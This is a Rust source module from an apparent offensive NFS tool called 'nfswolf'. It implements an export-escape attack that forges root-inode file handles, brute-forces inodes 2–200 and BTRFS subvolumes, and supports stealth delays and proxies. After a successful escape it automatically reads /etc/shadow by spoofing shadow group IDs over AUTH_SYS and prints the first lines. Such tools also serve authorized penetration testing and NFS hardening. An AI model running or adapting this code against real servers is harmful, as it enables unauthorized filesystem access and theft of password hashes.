//! Export escape: construct a root file handle for the underlying
//! filesystem and verify it live.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem. This module is the single entry point for
//! that primitive: it prints a hex root handle which the operator passes
//! to `shell --handle` or any other module that takes `--handle HEX`.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{make_client_with_hostname, make_mount_client, parse_addr_with_port};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::util::stealth::StealthConfig;
use nfs3_types::nfs3::Nfs3Result;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Tries to reach the filesystem root outside the exported directory by
/// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
/// BTRFS: 256+). The server accepts the handle without verifying it is
/// within the export boundary.
///
/// Strategy (automatic, no flags needed):
///   1. Probe known root inodes for the detected filesystem type.
///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
///   3. For BTRFS, enumerate subvolume IDs starting at 256.
///
/// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
/// not STALE) before being shown. Pass it to `shell --handle` to browse
/// the full filesystem.
///
/// Examples:
///   nfswolf escape 192.168.1.10:/srv
///   nfswolf escape 192.168.1.10 --export /srv --btrfs-subvols 32
#[derive(Parser)]
pub(crate) struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,
}

/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
/// auto pass uses the same depth as a manual `escape` invocation.
pub(crate) const DEFAULT_BTRFS_SUBVOLS: u32 = 16;

/// Default inode-scan depth for the escape fallback pass. The root inode is
/// always within the first 200 inodes on any Linux filesystem. Shared with
/// `scan --auto-escape`.
pub(crate) const DEFAULT_MAX_ROOT_SCAN: u32 = 200;

/// Outcome of an escape attempt against a single export.
///
/// Returned by [`find_escape`] so callers decide how to render it: the `escape`
/// subcommand prints a verbose report (and reads /etc/shadow on success), while
/// `scan --auto-escape` prints a one-line-per-export summary.
#[derive(Debug)]
pub(crate) enum EscapeOutcome {
    /// A filesystem-root handle was constructed and verified live (GETATTR
    /// returned NFS3_OK on a directory, or ACCES -- format accepted).
    Success {
        /// The verified root handle plus its filesystem fingerprint.
        candidate: EscapeResult,
        /// How the handle was found (e.g. "verified", "found via scan").
        note: String,
    },
    /// Handle format is valid (STALE hits) but the root inode was not found
    /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
    StaleNoRoot,
    /// The server rejected the handle format entirely (BADHANDLE): the export
    /// is not escapable with this technique (non-Linux server, signed handles).
    Unsupported,
}

/// Run the escape command.
pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Strategy (fully automatic, no flags needed):
///   1. Mount the export and detect the filesystem type from the handle format.
///   2. Probe known root inodes for the detected type.
///   3. If all known candidates return STALE, fall back to scanning
///      inodes 2..=max_root_scan.
///
/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
/// being shown. ACCES counts as a hit -- the handle format is valid; only the
/// credential is rejected.
async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
    let (probe_client, outcome) = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await?;
    match outcome {
        EscapeOutcome::Success { candidate, note } => {
            print_escape_success(&candidate, &note, host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
        },
        EscapeOutcome::StaleNoRoot => {
            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
        },
        EscapeOutcome::Unsupported => {
            // Covers both "export already is the filesystem root" (find_escape prints the
            // specific reason above) and a genuine handle-format rejection (BADHANDLE).
            eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
        },
    }
    Ok(())
}

/// Shared export-escape primitive behind both `escape` and `scan --auto-escape`.
///
/// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
/// filesystem-root handle (BTRFS subvolumes, then ext4/XFS known inodes, then a
/// fallback inode scan). Returns the probe client -- so the caller can perform
/// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
///
/// uid=0 keeps permission errors (squashed root) distinguishable from format
/// errors (STALE/BADHANDLE); the handle is a bearer token, so any later
/// credential works with it (RFC 1094 S2.3.3).
///
/// Per-candidate progress lines are written to stderr only when `announce` is
/// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
/// one-line-per-export summary instead.
pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
    use nfs3_types::nfs3::nfsstat3;
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, export).await?;

    // Honour the global stealth delay on the probe path (every RPC path must
    // respect StealthConfig); with the default --delay 0 this is a no-op.
    // `globals.nfs_port` routes the probe client straight to the NFS port when
    // portmapper is firewalled.
    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);

    // The export root's own inode. A candidate handle that resolves to this same
    // inode has crossed no boundary (whole-filesystem export, incl. the
    // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
    // not be reported as an escape (#22/#48). `None` when root_squash blocks the
    // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
    let export_fileid: Option<u64> = match probe_client.getattr(&nfs3_types::nfs3::GETATTR3args { object: mnt.handle.to_nfs_fh3() }).await {
        Ok(Nfs3Result::Ok(ok)) => Some(ok.obj_attributes.fileid),
        _ => None,
    };

    // Guard: if the export already IS the filesystem root there is nothing outside the
    // export to reach -- reconstructing inode 2 / 128 just reproduces a handle inside the
    // export, whose GETATTR (OK+NF3DIR) would otherwise be reported as a bogus "escape
    // successful". Short-circuit here so the guard covers Phase 1 AND the Phase-2 scan
    // (nfs_analyze applies the same `export_fileid in [2, 128]` check).
    if export_is_fs_root(&probe_client, &mnt.handle).await {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
        }
        return Ok((probe_client, EscapeOutcome::Unsupported));
    }

    // --- Phase 1: known root inodes for the detected filesystem type ---

    // BTRFS: try subvolume IDs (256..256+btrfs_subvols) first, then fall through.
    // construct_btrfs_subvol_handles can yield two variants per subvol on
    // compound-UUID handles (fsid_type 7 + 6 fallback) -- announce each subvol
    // ID only once so the operator-facing log isn't doubled.
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
    for candidate in &btrfs {
        if announce && announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified)".to_owned() }));
        }
    }

    // ext4 (inode 2) and XFS known candidates (128/64/32).  construct_root_candidates
    // fingerprints first so XFS inodes are not tried on a confirmed ext4 export, and for
    // the ambiguous compound-UUID format it queues BOTH the ext4 root (inode 2) and the
    // XFS roots -- probe_escape_candidate rejects non-directory hits, so a non-root inode
    // that happens to exist (e.g. inode 128 = ext4 journal file) is never a false escape.
    let known: Vec<EscapeResult> = FileHandleAnalyzer::construct_root_candidates(&mnt.handle);

    for candidate in &known {
        if announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
        }
        if probe_escape_candidate(&probe_client, candidate, export_fileid).await {
            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "verified".to_owned() }));
        }
    }

    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
    if announce && !known.is_empty() {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
    }

    let seed = &mnt.handle;
    let mut found_stale = false;

    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
            continue;
        };

        let args = nfs3_types::nfs3::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
        match probe_client.getattr(&args).await {
            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfs3_types::nfs3::ftype3::NF3DIR => {
                // A directory hit alone is not the root: inode numbers are dynamic
                // (XFS), so the first directory in 2..200 can be an arbitrary
                // subdirectory. Confirm it is not the export itself (identity) and
                // is genuinely the filesystem root (its own parent) before
                // declaring success (#27).
                let self_id = ok.obj_attributes.fileid;
                if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&probe_client, &candidate.root_handle, self_id).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root)".to_owned() }));
                }
                found_stale = true; // valid format + directory, but not the root -- keep scanning
                tracing::debug!(inode, "scan hit a directory but not the filesystem root -- continuing");
            },
            Ok(Nfs3Result::Ok(_)) => {
                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
                // ACCES proves only that the handle FORMAT was accepted (root_squash blocks
                // the uid=0 read) -- it is returned by ANY protected inode, so a bare ACCES
                // is NOT proof that this inode is a directory, let alone the filesystem root.
                // Confirm positively before declaring success; otherwise a random 0700
                // subdirectory in the scan range would be mislabelled as the root.
                found_stale = true; // the format is valid even when root cannot be confirmed
                if confirm_root_dir(&probe_client, &candidate).await {
                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
                }
                tracing::debug!(inode, "ACCES but root not confirmed -- continuing scan");
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => {
                found_stale = true;
                tracing::debug!(inode, "STALE");
            },
            Ok(Nfs3Result::Err((stat, _))) => {
                tracing::debug!(inode, ?stat, "probe rejected");
            },
            Err(e) => {
                tracing::debug!(inode, err = %e, "RPC error during escape scan");
            },
        }
    }

    let outcome = if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported };
    Ok((probe_client, outcome))
}

/// True when the exported directory is itself the filesystem root (so there is nothing
/// outside the export to reach).
///
/// Reads the export root's own inode via GETATTR and applies the same root-inode test as
/// the `construct_escape_handle` compound-UUID guard: fileid 2 is the unambiguous ext4
/// root; 32/64/128 are XFS roots only when the handle is XFS-identified (fileid_type 0x81),
/// because on a compound-UUID ext4 export those are ordinary low-numbered directory inodes.
async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
    let Ok(Nfs3Result::Ok(ok)) = client.getattr(&nfs3_types::nfs3::GETATTR3args { object: mount_handle.to_nfs_fh3() }).await else {
        return false; // cannot read the export root -- fall through to the normal probes
    };
    let export_inode = ok.obj_attributes.fileid;
    let is_xfs = mount_handle.as_bytes().get(3).copied() == Some(0x81) || matches!(FileHandleAnalyzer::fingerprint_fs(mount_handle), crate::engine::file_handle::FsType::Xfs);
    export_inode == 2 || (is_xfs && matches!(export_inode, 32 | 64 | 128))
}

/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
///
/// Two acceptance conditions:
/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
///   The directory check prevents false positives from non-root inodes that happen to
///   exist (on ext4, inode 128 is the journal file, not a directory).
/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
///   blocks uid=0 reads on the root dir).
async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>) -> bool {
    use nfs3_types::nfs3::{GETATTR3args, ftype3, nfsstat3};
    let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
    match client.getattr(&args).await {
        // A directory whose inode differs from the export root's is a genuine
        // escape. Reject a hit that resolves to the export's OWN inode -- a
        // whole-filesystem export (incl. the compound-UUID XFS case that
        // `export_is_fs_root` cannot fingerprint) reproduces the export root and
        // would otherwise be a bogus "escape successful" (#22/#48).
        Ok(Nfs3Result::Ok(ok)) => ok.obj_attributes.type_ == ftype3::NF3DIR && export_fileid.is_none_or(|exp| ok.obj_attributes.fileid != exp),
        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => true,
        _ => false,
    }
}

/// Definitive filesystem-root test for a fallback-scan directory hit: the root is
/// its own parent, so LOOKUP ".." resolves back to the same inode. A subdirectory
/// in the scan range (e.g. an XFS export with non-standard geometry) has a
/// different parent and is therefore rejected (#27).
async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
    use nfs3_types::nfs3::{GETATTR3args, LOOKUP3args, Nfs3Option, diropargs3, filename3};
    use nfs3_types::xdr_codec::Opaque;
    let lookup = LOOKUP3args { what: diropargs3 { dir: handle.to_nfs_fh3(), name: filename3(Opaque::owned(b"..".to_vec())) } };
    let Ok(Nfs3Result::Ok(ok)) = client.lookup(&lookup).await else { return false };
    let parent_id = match ok.obj_attributes {
        Nfs3Option::Some(a) => a.fileid,
        Nfs3Option::None => {
            let parent = FileHandle::from_nfs_fh3(&ok.object);
            match client.getattr(&GETATTR3args { object: parent.to_nfs_fh3() }).await {
                Ok(Nfs3Result::Ok(g)) => g.obj_attributes.fileid,
                _ => return false,
            }
        },
    };
    parent_id == self_fileid
}

/// Positively confirm a scan-hit candidate is a directory (ideally the filesystem root)
/// before accepting a bare ACCES as an escape.
///
/// During the fallback inode scan a uid=0 GETATTR returns ACCES whenever root_squash
/// blocks the read -- but EVERY protected inode returns ACCES, so ACCES alone is not
/// proof of root (it would otherwise mark a random 0700 subdirectory as the filesystem
/// root). Re-probe as the conventional root_squash anon identity (uid/gid 65534): the
/// real root dir is world-traversable (mode 0755), so a NF3DIR GETATTR -- or a successful
/// LOOKUP of a customary top-level entry (etc/bin/usr/...), which only the filesystem root
/// carries -- gives the positive signal a bare ACCES lacks.
async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
    use nfs3_types::nfs3::{GETATTR3args, LOOKUP3args, diropargs3, filename3, ftype3};
    use nfs3_types::xdr_codec::Opaque;

    // root_squash conventionally maps root -> anonuid 65534 (nobody); claim it directly so
    // perms on the root dir (0755) are evaluated against an ordinary unprivileged uid.
    let cred = Credential::Sys(AuthSys::with_groups(65534, 65534, &[65534], client.machinename()));
    let unpriv = client.with_credential(cred, 65534, 65534);

    // Positive signal 1: the handle resolves to a directory for a non-root uid.
    if let Ok(Nfs3Result::Ok(ok)) = unpriv.getattr(&GETATTR3args { object: candidate.root_handle.to_nfs_fh3() }).await
        && ok.obj_attributes.type_ == ftype3::NF3DIR
    {
        return true;
    }

    // Positive signal 2: a customary top-level entry resolves -- only the real filesystem
    // root carries these, so a successful LOOKUP confirms root.
    for name in [b"etc".as_slice(), b"bin".as_slice(), b"usr".as_slice(), b"var".as_slice(), b"lib".as_slice()] {
        let lookup = LOOKUP3args { what: diropargs3 { dir: candidate.root_handle.to_nfs_fh3(), name: filename3(Opaque::owned(name.to_vec())) } };
        if let Ok(Nfs3Result::Ok(_)) = unpriv.lookup(&lookup).await {
            return true;
        }
    }
    false
}

/// Print the successful escape result and next-step hints.
fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    use nfs3_types::nfs3::{LOOKUP3args, READ3args, diropargs3, filename3};
    use nfs3_types::xdr_codec::Opaque;

    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    // LOOKUP /etc
    let etc_args = LOOKUP3args { what: diropargs3 { dir: root_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"etc".to_vec())) } };
    let etc_fh = match client.lookup(&etc_args).await {
        Ok(Nfs3Result::Ok(ok)) => FileHandle::from_nfs_fh3(&ok.object),
        _ => return,
    };

    // LOOKUP /etc/shadow
    let shadow_args = LOOKUP3args { what: diropargs3 { dir: etc_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"shadow".to_vec())) } };
    let shadow_fh = if let Ok(Nfs3Result::Ok(ok)) = client.lookup(&shadow_args).await {
        FileHandle::from_nfs_fh3(&ok.object)
    } else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        let read_args = READ3args { file: shadow_fh.to_nfs_fh3(), offset: 0, count: 65536 };
        if let Ok(Nfs3Result::Ok(ok)) = shadow_client.read(&read_args).await {
            let content = String::from_utf8_lossy(ok.data.as_ref());
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}
